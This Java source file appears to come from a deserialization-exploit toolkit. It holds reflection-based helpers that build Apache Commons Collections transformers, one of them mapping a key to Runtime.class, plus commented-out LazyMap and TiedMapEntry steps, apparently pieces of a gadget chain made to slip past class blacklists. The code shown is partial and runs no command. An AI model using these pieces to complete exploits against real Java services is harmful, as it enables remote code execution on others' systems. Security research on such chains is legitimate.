package util.bypassblacklistclass;

import org.apache.commons.collections.functors.MapTransformer;
import org.apache.commons.collections.functors.NOPTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.python.core.PyMethod;
import sun.misc.Unsafe;
import util.UnsafeUtil;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

public class CC {
    public static MapTransformer getMapTransformer(String key) throws ClassNotFoundException, NoSuchMethodException, NoSuchFieldException, IllegalAccessException, InstantiationException, InvocationTargetException {
        Class clazz1 =
                Class.forName("org.apache.commons.collections.functors.MapTransformer");
        Constructor constructor = clazz1.getDeclaredConstructor(Map.class);
        constructor.setAccessible(true);
        HashMap map = new HashMap<>();
        map.put(key,Runtime.class);
        MapTransformer emapTransformer = (MapTransformer)
                constructor.newInstance(map);
//        Class clazz1 =
//                Class.forName("org.apache.commons.collections.functors.MapTransformer");
//        Constructor constructor = clazz1.getDeclaredConstructor(Map.class);
//        constructor.setAccessible(true);
//        MapTransformer emapTransformer = (MapTransformer)
//                constructor.newInstance(map2);
//        Map outerMap = LazyMap.decorate(map,emapTransformer);
//        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap,"2.txt");
        return emapTransformer;
    }
    public static NOPTransformer getNOPTransformer() throws ClassNotFoundException, NoSuchMethodException, NoSuchFieldException, IllegalAccessException, InstantiationException, InvocationTargetException {
        Class clazz1 =
                Class.forName("org.apache.commons.collections.functors.NOPTransformer");
        Constructor constructor = clazz1.getDeclaredConstructor();
        constructor.setAccessible(true);
        NOPTransformer nopTransformer = (NOPTransformer)
                constructor.newInstance();
//        Class clazz1 =
//                Class.forName("org.apache.commons.collections.functors.MapTransformer");
//        Constructor constructor = clazz1.getDeclaredConstructor(Map.class);
//        constructor.setAccessible(true);
//        MapTransformer emapTransformer = (MapTransformer)
//                constructor.newInstance(map2);
//        Map outerMap = LazyMap.decorate(map,emapTransformer);
//        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap,"2.txt");
        return nopTransformer;
    }

    public static void main(String[] args) throws NoSuchFieldException, ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InstantiationException, InvocationTargetException {
        getMapTransformer("Squirt1e");
    }
}
